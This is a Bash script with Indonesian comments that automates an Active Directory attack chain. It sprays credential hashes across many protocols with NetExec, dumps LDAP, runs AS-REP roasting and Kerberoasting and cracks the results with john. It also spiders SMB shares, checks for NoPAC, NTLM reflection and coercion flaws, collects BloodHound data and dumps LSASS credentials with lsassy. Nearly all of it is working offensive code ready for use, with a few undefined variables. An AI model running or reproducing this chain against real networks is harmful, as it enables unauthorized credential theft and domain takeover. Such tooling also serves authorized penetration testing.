#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"
BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
: > "$BROKEN_PIPE_LOG"
DC_INFO="$OUTDIR/dc_domain_mapping.txt"
DC_CANDIDATES="$OUTDIR/dc_candidates.txt"
FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
echo "" > "$FINAL_CRACKED"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] Spray Auth All Protocol${NC}"
echo -e "${PURPLE}====================================================${NC}"

# Validasi File
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' tidak ada!${NC}" && exit 1
done

mapfile -t MAPFILE_U < "$USER_FILE"
mapfile -t MAPFILE_P < "$PASS_FILE"

# =========================
# INIT GLOBAL STATE
# =========================
declare -A DC_MAP
declare -A ASREP_DONE
declare -A KERB_DONE

# =========================
# LOAD DC MAPPING (dc_ip;domain;dc_fqdn)
# =========================
# Deklarasikan associative array baru untuk menampung FQDN
declare -A DC_FQDN_MAP

if [[ -s "$DC_INFO" ]]; then
    # Membaca 3 kolom: dc_ip, dc_domain, dan dc_fqdn
    while IFS=';' read -r dc_ip dc_domain dc_fqdn || [[ -n "$dc_ip" ]]; do
        # Abaikan baris kosong atau baris komentar
        [[ -z "$dc_ip" || "$dc_ip" =~ ^# ]] && continue
        
        # Bersihkan spasi/karakter newline yang tidak terlihat
        dc_ip=$(echo "$dc_ip" | xargs)
        dc_domain=$(echo "$dc_domain" | xargs)
        dc_fqdn=$(echo "$dc_fqdn" | xargs)

        # Simpan IP DC berdasarkan domain
        DC_MAP["$dc_domain"]="$dc_ip"
        
        # Simpan FQDN DC berdasarkan domain (jika kolom ke-3 kosong, buat fallback otomatis)
        if [[ -n "$dc_fqdn" ]]; then
            DC_FQDN_MAP["$dc_domain"]="$dc_fqdn"
        else
            # Fallback jika kolom ke-3 di dc_domain_mapping.txt terlewat/kosong
            DC_FQDN_MAP["$dc_domain"]="DC-01.$dc_domain"
        fi
    done < "$DC_INFO"

    echo -e "${GREEN}[+] Loaded DC mapping:${NC}"
    for d in "${!DC_MAP[@]}"; do
        echo -e "    ${CYAN}$d${NC} -> IP: ${YELLOW}${DC_MAP[$d]}${NC} | FQDN: ${MAGENTA}${DC_FQDN_MAP[$d]}${NC}"
    done
else
    echo -e "${YELLOW}[!] No DC mapping file found ($DC_INFO)${NC}"
fi

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

# =========================
# BUILD IP → PROTO MAP
# =========================
declare -A PROTO_MAP

for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue

    while read -r ip; do
        [[ -z "$ip" ]] && continue
        PROTO_MAP["$ip"]+="$proto "
    done < "$FILE_PROTO"
done

# =========================
# DOMAIN CACHE (PER IP)
# =========================
declare -A DOMAIN_CACHE

get_domain() {
    local ip="$1"

    # cache hit
    if [[ -n "${DOMAIN_CACHE[$ip]}" ]]; then
        echo "${DOMAIN_CACHE[$ip]}"
        return
    fi

    local domain=""
    for i in {1..3}; do
        domain=$(nxc smb "$ip" --no-progress 2>/dev/null | \
                 grep -oP '(?<=domain:)[^ )]+' | head -n1)

        [[ -n "$domain" && "$domain" != "WORKGROUP" ]] && break
        sleep 1
    done

    [[ -z "$domain" || "$domain" == "WORKGROUP" ]] && domain="."

    DOMAIN_CACHE[$ip]="$domain"
    echo "$domain"
}

# --- HELPER FUNCTION FOR NETEXEC CLEANING ---
clean_nxc_file() {
    local file="$1"
    [[ ! -f "$file" ]] && return 0
    LC_ALL=C perl -i -pe 's/\x00//g; s/\r//g' "$file"
}

# =========================
# RUN NXC FUNCTION
# =========================
run_nxc() {
    local proto="$1" ip="$2" user="$3" pass="$4" extra="$5" domain_flag="$6"

    local MAX_RETRY=3
    local attempt=1

    while (( attempt <= MAX_RETRY )); do
      echo -e "\n${PURPLE}[EXEC][Attempt $attempt] nxc $proto $ip -u '$user' -H '$pass' $extra $domain_flag${NC}"

      timeout 25s nxc "$proto" "$ip" -u "$user" -H"$pass" $extra $domain_flag --no-progress > .tmp_res 2>&1
      exit_code=$?

      cat .tmp_res
      cat .tmp_res >> "$RAW_OUT"

      # =========================
      # 1. TIMEOUT / CONNECTION ISSUE
      # =========================
      if [[ $exit_code -eq 124 ]] || grep -qiE "Broken Pipe|NETBIOS connection.*timed out|connection.*timed out" .tmp_res; then
          echo -e "${YELLOW}[!] Timeout/Connection issue (attempt $attempt/$MAX_RETRY)${NC}"

          ((attempt++))
          sleep 2
          continue
      fi

      # =========================
      # 2. SUCCESS
      # =========================
      if grep -qE "\[\+\]|Pwn3d!" .tmp_res; then
          echo -e "${GREEN}[+] Valid credentials found${NC}"
          grep -E "\[\+\]|Pwn3d!" .tmp_res | head -n1 >> "$CLEAN_OUT"
          return 0
      fi

      # =========================
      # 3. HARD FAIL (JANGAN RETRY)
      # =========================
      if grep -q "\[-\]" .tmp_res && ! grep -qiE "timed out|Broken Pipe" .tmp_res; then
          echo -e "${RED}[-] Invalid credentials (no retry)${NC}"
          return 1
      fi

      # =========================
      # 4. OTHER FAILURE → RETRY
      # =========================
      echo -e "${YELLOW}[!] Auth failed / unknown response (attempt $attempt/$MAX_RETRY)${NC}"

      ((attempt++))
      sleep 1
  done


    # =========================
    # AFTER ALL RETRY FAIL
    # =========================
    echo -e "${RED}[!] Persistent Error / Broken Pipe on $ip ($proto) → manual check needed${NC}"
    echo "$ip;$proto;$user" >> "$BROKEN_PIPE_LOG"

    return 1
}

# =========================
# MAIN LOOP (IP FIRST)
# =========================
for ip in "${!PROTO_MAP[@]}"; do
    echo -e "\n${CYAN}>>> Target Host: $ip${NC}"

    # --- DOMAIN DISCOVERY ---
    echo -e "${GRAY}[DEBUG] Discovering domain...${NC}"
    DOMAIN=$(get_domain "$ip")
    echo -e "${GRAY}[DEBUG] Domain: $DOMAIN${NC}"

    for proto in ${PROTO_MAP[$ip]}; do
        echo -e "\n${BLUE}[+] PROTOCOL: ${proto^^}${NC}"

        for user in "${MAPFILE_U[@]}"; do
            USER_COMPLETED=false

            for pass in "${MAPFILE_P[@]}"; do
                # 1. Inisialisasi awal untuk Local Auth
                EXTRA=""
                [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
                DOMAIN_ARG=""

                # =========================
                # 1. LOCAL AUTH
                # =========================
                # (Asumsi: fungsi run_nxc mengisi file .tmp_res)
                if run_nxc "$proto" "$ip" "$user" "$pass" "$EXTRA" ""; then
                    USER_COMPLETED=true
                fi

                # =========================
                # 2. DOMAIN AUTH (skip kalau domain ".")
                # =========================
                if [[ "$USER_COMPLETED" == "false" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
                    if run_nxc "$proto" "$ip" "$user" "$pass" "" "-d $DOMAIN"; then
                        USER_COMPLETED=true
                        # PERBAIKAN: Jika sukses di Domain Auth, EXTRA harus kosong
                        # dan kita butuh flag domain untuk langkah selanjutnya
                        EXTRA=""
                        DOMAIN_ARG="-d $DOMAIN"
                    fi
                fi

                # =========================
                # SUCCESS HANDLING
                # =========================
                if [[ "$USER_COMPLETED" == "true" ]]; then
                    AUTH_RESULT=$(cat .tmp_res)
                    echo -e "${GREEN}[!] Success: $user@$ip${NC}"

                    dc_ip="${DC_MAP[$DOMAIN]}"

                    # =========================
                    # LDAP DUMP
                    # =========================
                    if [[ "$proto" == "ldap" ]]; then
                        DUMP_PATH="$OUTDIR/ldap_$ip"
                        mkdir -p "$DUMP_PATH"

                        echo -e "${YELLOW}[!] Running ldapdomaindump...${NC}"

                        if [[ "$DOMAIN" == "." ]]; then
                            LDAP_USER="$user"
                        else
                            LDAP_USER="${DOMAIN}\\$user"
                        fi

                        ldapdomaindump "$ip" -u "$LDAP_USER" -p "aad3b435b51404eeaad3b435b51404ee:$pass" -at NTLM -o "$DUMP_PATH" >/dev/null 2>&1
                    fi


                    # =========================
                    # ASREP ROAST (ONCE PER DOMAIN)
                    # =========================
                    echo -e "${GRAY}[DEBUG] DOMAIN=$DOMAIN | DC=${DC_MAP[$DOMAIN]}${NC}"
                    if [[ -n "$dc_ip" && "$DOMAIN" != "." && -z "${ASREP_DONE[$DOMAIN]}" ]]; then
                        ASREP_DONE[$DOMAIN]=1

                        echo -e "${PURPLE}[EXEC] ASREP roasting → $DOMAIN ($dc_ip)${NC}"

                        ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                        USERS_FILE="$OUTDIR/users_${DOMAIN}.txt"

                        # Ambil user dari LDAP dump kalau ada
                        if [[ -s "$OUTDIR/ldap_$ip/domain_users.grep" ]]; then
                            awk '{print $1}' "$OUTDIR/ldap_$ip/domain_users.grep" | sort -u > "$USERS_FILE"
                        else
                            printf "%s\n" "${MAPFILE_U[@]}" > "$USERS_FILE"
                        fi

                        timeout 30s impacket-GetNPUsers "$DOMAIN/$user:$pass" \
                            -dc-ip "$dc_ip" \
                            -request \
                            -format hashcat \
                            -outputfile "$ASREP_HASH_FILE" >/dev/null 2>&1


                        if [[ -s "$ASREP_HASH_FILE" ]]; then
                            echo -e "${RED}[!] ASREP hash found:${NC}"
                            cat "$ASREP_HASH_FILE"

                            echo -e "${YELLOW}[*] Cracking ASREP hashes...${NC}"
                            john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
                                 "$ASREP_HASH_FILE"

                            echo -e "${GREEN}[+] Cracked ASREP results:${NC}"
                            ASREP_RESULT=$(john --show "$ASREP_HASH_FILE")

                            echo "$ASREP_RESULT"

                            # append ke file final
                            if [[ -n "$ASREP_RESULT" ]]; then
                                echo -e "\n[ASREP]" >> "$FINAL_CRACKED"
                                echo "$ASREP_RESULT" | grep ":" >> "$FINAL_CRACKED"
                            fi

                        else
                            echo -e "${GREEN}[+] No ASREP roastable users${NC}"
                        fi

                    fi

                    # =========================
                    # KERBEROAST (ONCE PER DOMAIN)
                    # =========================
                    if [[ -n "$dc_ip" && "$DOMAIN" != "." && -z "${KERB_DONE[$DOMAIN]}" ]]; then
                        KERB_DONE[$DOMAIN]=1

                        echo -e "${PURPLE}[EXEC] Kerberoasting → $DOMAIN ($dc_ip)${NC}"

                        KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"

                        timeout 30s impacket-GetUserSPNs "$DOMAIN/$user:$pass" \
                            -dc-ip "$dc_ip" \
                            -request \
                            -outputfile "$KERB_HASH_FILE" >/dev/null 2>&1


                        if [[ -s "$KERB_HASH_FILE" ]]; then
                            echo -e "${RED}[!] Kerberoast hash found:${NC}"
                            cat "$KERB_HASH_FILE"

                            john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
                                 "$KERB_HASH_FILE" >/dev/null 2>&1

                            KERB_RESULT=$(john --show "$KERB_HASH_FILE")

                            echo -e "${GREEN}[+] Cracked Kerberoast results:${NC}"
                            echo "$KERB_RESULT"

                            # append ke file final
                            if [[ -n "$KERB_RESULT" ]]; then
                                echo -e "\n[KERBEROAST]" >> "$FINAL_CRACKED"
                                echo "$KERB_RESULT" | grep ":" >> "$FINAL_CRACKED"
                            fi

                        else
                            echo -e "${GREEN}[+] No Kerberoastable accounts${NC}"
                        fi
                    fi

                    # =========================
                    # SMB POST EXPLOIT
                    # =========================

                    if [[ "$proto" == "smb" ]]; then
                        # Cek apakah akses SMB valid (+)
                        if echo "$AUTH_RESULT" | grep -q "\[+\]"; then
                            echo -e "${YELLOW}[DEBUG] SMB access confirmed${NC}"

                            # -------------------------------------------------------
                            # 1. SPIDER_PLUS
                            # -------------------------------------------------------
                            attempt_sp=1
                            while [ $attempt_sp -le 3 ]; do
                                # Susun command ke dalam variabel biar gampang di-echo
                                SP_CMD="nxc smb $ip -u '$user' -H '$pass' $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=$(readlink -f "$SPIDER_DIR")"

                                echo -e "${PURPLE}[EXEC][Attempt $attempt_sp] $SP_CMD${NC}"
                                
                                # Eksekusi command dari variabel
                                timeout 60s bash -c "$SP_CMD" | tee .tmp_sp

                                # Jika SUKSES (Ada list share)

                                if grep -qi "Saved share-file metadata to" .tmp_sp; then
                                    # Ekstrak path file JSON dari output untuk verifikasi (opsional tapi sangat berguna)
                                    JSON_PATH=$(grep -oiE '"[^" ]+\.json"' .tmp_sp | tr -d '"')
                                    
                                    echo -e "${GREEN}[+] spider_plus success! Metadata saved to: ${JSON_PATH}${NC}"
                                    break
                                
                                # Jika GAGAL (Koneksi, Timeout, Broken Pipe, atau No Shares)
                                else
                                    if [ $attempt_sp -eq 3 ]; then
                                        echo -e "${RED}[!] Final Attempt Fail on $ip (spider_plus) → Logged${NC}"
                                        echo "$ip;smb_spider;$user" >> "$BROKEN_PIPE_LOG"
                                        break
                                    fi
                                    
                                    echo -e "${YELLOW}[!] Issue detected, retrying ($attempt_sp/3)...${NC}"
                                    rm -f "$ABS_OUT/${ip}.json" 2>/dev/null
                                    ((attempt_sp++))
                                    sleep 3
                                fi

                            done
                            # -------------------------------------------------------
                            # 2. AUTHENTICATED SMB VULNERABILITY CHECKS
                            # -------------------------------------------------------
                            echo -e "\n${YELLOW}[*] SMB Auth: Running post-exploit vulnerability checks...${NC}"

                            # --- A. NoPAC (KB5008380 / SamAccountName Spoofing) ---
                            NOPAC_CMD="nxc smb $ip -u '$user' -H '$pass' $DOMAIN_ARG -M nopac"
                            echo -e "${MAGENTA}[CMD] $NOPAC_CMD${NC}"
                            
                            timeout 30s nxc smb "$ip" -u "$user" -H "$pass" $DOMAIN_ARG -M nopac 2>&1 | tee .tmp_nopac | tee -a "$RAW_OUT"
                            clean_nxc_file .tmp_nopac

                            if grep -aqi "VULNERABLE" .tmp_nopac; then
                                echo -e "${RED}[!!!] ALERT: $ip is VULNERABLE to NoPAC (CVE-2021-42278/CVE-2021-42287)!${NC}"
                                echo "[!] NoPAC VULNERABLE on $ip (Auth User: $user)" >> "$RAW_OUT"
                            else
                                echo -e "${GREEN}[+] NoPAC check completed (Not vulnerable or patched).${NC}"
                            fi


                            # --- B. NTLM Reflection ---
                            NTLM_REF_CMD="nxc smb $ip -u '$user' -H '$pass' $DOMAIN_ARG -M ntlm_reflection"
                            echo -e "${MAGENTA}[CMD] $NTLM_REF_CMD${NC}"
                            
                            timeout 30s nxc smb "$ip" -u "$user" -H "$pass" $DOMAIN_ARG -M ntlm_reflection 2>&1 | tee .tmp_ntlmref | tee -a "$RAW_OUT"
                            clean_nxc_file .tmp_ntlmref

                            if grep -aqi "vulnerable" .tmp_ntlmref; then
                                echo -e "${RED}[!!!] ALERT: $ip is VULNERABLE to NTLM Reflection!${NC}"
                                echo "[!] NTLM Reflection VULNERABLE on $ip (Auth User: $user)" >> "$RAW_OUT"
                            else
                                echo -e "${GREEN}[+] NTLM Reflection check completed.${NC}"
                            fi


                            # --- C. Coerce Plus (Authenticated Coercion Check) ---
                            # Kita jalankan kembali dengan kredensial karena beberapa RPC interface hanya bisa di-trigger setelah auth
                            COERCE_AUTH_CMD="nxc smb $ip -u '$user' -H '$pass' $DOMAIN_ARG -M coerce_plus"
                            echo -e "${MAGENTA}[CMD] $COERCE_AUTH_CMD${NC}"
                            
                            timeout 40s nxc smb "$ip" -u "$user" -H "$pass" $DOMAIN_ARG -M coerce_plus 2>&1 | tee .tmp_coerce_auth | tee -a "$RAW_OUT"
                            clean_nxc_file .tmp_coerce_auth

                            if grep -aqi "vulnerable" .tmp_coerce_auth || grep -aqi "success" .tmp_coerce_auth; then
                                echo -e "${RED}[!!!] ALERT: Coercion (coerce_plus) vulnerability detected on $ip with authenticated user!${NC}"
                            else
                                echo -e "${GREEN}[+] Authenticated Coercion check completed.${NC}"
                            fi

                            # Bersihkan temporary files
                            rm -f .tmp_nopac .tmp_ntlmref .tmp_coerce_auth

                       # -------------------------------------------------------
                            # 3. BLOODHOUND INGESTION (Python Collector)
                            # -------------------------------------------------------
                            echo -e "\n${YELLOW}[*] AD Recon: Running BloodHound Python Ingestor...${NC}"
                            
                            # Buat folder khusus BloodHound agar file JSON hasil dump tidak berantakan
                            BH_DIR="$OUTDIR/bloodhound_${ip}"
                            mkdir -p "$BH_DIR"
                            
                            # 1. Bersihkan variabel domain agar hanya berisi nama domain bersih (misal: shadow.gate)
                            CLEAN_DOMAIN=$(echo "$DOMAIN_NAME" | sed 's/^-d //; s/^--domain //')
                            
                            # Deklarasikan variabel FQDN default kosong
                            DC_FQDN=""

                            # Jika file mapping ada, kita ambil Domain dan FQDN-nya sekaligus secara konsisten
                            MAPPING_FILE="$OUTDIR/dc_domain_mapping.txt"
                            if [[ -f "$MAPPING_FILE" ]]; then
                                # Cari baris yang cocok dengan IP target saat ini
                                MAP_ROW=$(grep "$ip" "$MAPPING_FILE" | head -n 1)
                                if [[ -n "$MAP_ROW" ]]; then
                                    # Ambil domain (kolom 2) jika sebelumnya bernilai "auto" atau kosong
                                    if [[ "$CLEAN_DOMAIN" == "auto" || -z "$CLEAN_DOMAIN" ]]; then
                                        CLEAN_DOMAIN=$(echo "$MAP_ROW" | cut -d';' -f2 | xargs)
                                    fi
                                    # Ambil FQDN langsung dari kolom 3
                                    DC_FQDN=$(echo "$MAP_ROW" | cut -d';' -f3 | xargs)
                                fi
                            fi
                            
                            # Fallback jika domain benar-benar tidak terdeteksi
                            CLEAN_DOMAIN="${CLEAN_DOMAIN:-WORKGROUP}"

                            # 2. Validasi & Fallback untuk DC_FQDN (Wajib berupa format FQDN untuk bloodhound-python)
                            if [[ -z "$DC_FQDN" || "$CLEAN_DOMAIN" == "WORKGROUP" ]]; then
                                # Jika mapping kosong/gagal, buat FQDN bayangan yang aman (bukan IP) agar tidak memicu error validator
                                DC_FQDN="DC01.${CLEAN_DOMAIN}"
                            fi

                            # [LOGIKA LANGKAH 3 YANG TUMPANG TINDIH SUDAH DIHAPUS DARI SINI]

                            # 3. Eksekusi BloodHound dengan parameter 100% dinamis
                            # Mengekstrak NT Hash saja jika input dari user ternyata format full LM:NT
                            NT_HASH="${pass##*:}"

                            # Eksekusi bloodhound-python versi selalu menggunakan hash


                            BH_CMD="bloodhound-python -d "$CLEAN_DOMAIN" -dc "$DC_FQDN" -u "$user" --hashes "aad3b435b51404eeaad3b435b51404ee:$NT_HASH" -ns "$ip" -c all --zip"
                            echo -e "${MAGENTA}[CMD] (Inside $BH_DIR) $BH_CMD${NC}"
                            
                            # Jalankan di subshell agar tidak mengubah directory kerja script utama
                            (
                                cd "$BH_DIR" || exit
                                timeout 2000s bloodhound-python -d "$CLEAN_DOMAIN" -dc "$DC_FQDN" -u "$user" --hashes "aad3b435b51404eeaad3b435b51404ee:$NT_HASH" -ns "$ip" -c all --zip 2>&1 | tee .tmp_bh
                            )

                            # Verifikasi hasil dump
                            if grep -qi "Done writing" "$BH_DIR/.tmp_bh" || ls "$BH_DIR"/*.json &>/dev/null; then
                                echo -e "${GREEN}[+] BloodHound ingestion successful! JSON files saved in: $BH_DIR${NC}"
                                rm -f "$BH_DIR/.tmp_bh"
                            else
                                echo -e "${RED}[-] BloodHound ingestion failed or timed out.${NC}"
                                rm -f "$BH_DIR/.tmp_bh"
                            fi

                            # -------------------------------------------------------
                            # 2. LSASSY (With Retry Logic - Only if Pwn3d!)
                            # -------------------------------------------------------
                            if echo "$AUTH_RESULT" | grep -qE "Pwn3d!|\[+\]"; then
                              attempt_ls=1
                              while [ $attempt_ls -le 3 ]; do
                                  LS_CMD="nxc smb \"$ip\" -u \"$user\" -H \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy"
                                  
                                  echo -e "${RED}[EXEC][Attempt $attempt_ls] $LS_CMD${NC}"
                                  
                                  # Eksekusi dengan timeout agar tidak hang
                                  timeout 40s bash -c "$LS_CMD" | tee .tmp_ls

                                  # Jika SUKSES
                                  if grep -qiE "dumped|success" .tmp_ls; then
                                      echo -e "${GREEN}[+] lsassy success!${NC}"
                                      cat .tmp_ls >> "$RAW_OUT"
                                      break
                                      
                                  # Jika GAGAL (Apapun alasannya: Timeout, No Admin, AV Block)
                                  else
                                      if [ $attempt_ls -eq 3 ]; then
                                          echo -e "${RED}[!] Final Attempt Fail on $ip (lsassy) → Logged${NC}"
                                          echo "$ip;smb_lsassy;$user" >> "$BROKEN_PIPE_LOG"
                                          break
                                      fi
                                      
                                      echo -e "${YELLOW}[!] lsassy failed/issue, retrying ($attempt_ls/3)...${NC}"
                                      ((attempt_ls++))
                                      sleep 3
                                  fi
                              done
                          fi
                        fi
                    fi

                    echo -e "${CYAN}[i] Skipping remaining passwords for $user${NC}"
                    break
                fi
            done
        done
    done
done

rm -f .tmp_res

# --- MULAI PROSES PEMBERSIHAN (DI LUAR LOOP) ---
FINAL_OUT="$OUTDIR/final_summary.txt"

if [[ -f "$RAW_OUT" ]]; then

    # 1. Bersihkan ANSI color (lebih universal)
    sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$RAW_OUT" > "$OUTDIR/temp_clean.log"

    # 2. Ambil baris penting & dedup tanpa ubah urutan
    grep -aEi "\[\*\]|\[\+\]|LSASSY|VULN|TGT with|TGT without|PetitPotam|DFSCoerce|ShadowCoerce|CVE" "$OUTDIR/temp_clean.log" | \
    awk '!seen[$0]++' > "$FINAL_OUT"

    echo -e "\n${PURPLE}====================================================${NC}"
    echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
    echo -e "${PURPLE}====================================================${NC}"

    if [[ -s "$FINAL_OUT" ]]; then
        while IFS= read -r line; do
            case "$line" in
                *LSASSY*)
                    echo -e "${PURPLE}${line}${NC}"
                    ;;
                *"[+]"*)
                    echo -e "${GREEN}${line}${NC}"
                    ;;
                *"[*]"*)
                    echo -e "${BLUE}${line}${NC}"
                    ;;
                *)
                    echo -e "${line}"
                    ;;
            esac
        done < "$FINAL_OUT"
    else
        echo -e "${YELLOW}[!] Tidak ada data ditemukan.${NC}"
    fi
    if [[ -s "$BROKEN_PIPE_LOG" ]]; then
      echo -e "\n${RED}[!] BROKEN PIPE HOSTS (MANUAL CHECK REQUIRED)${NC}"
      cat "$BROKEN_PIPE_LOG"
    fi

    # Cleanup aman
    rm -f "$OUTDIR/temp_clean.log"

else
    echo -e "${RED}[!] File mentah $RAW_OUT tidak ditemukan!${NC}"
fi

echo -e "\n${GREEN}[+] ALL PROCESSES FINISHED.${NC}"
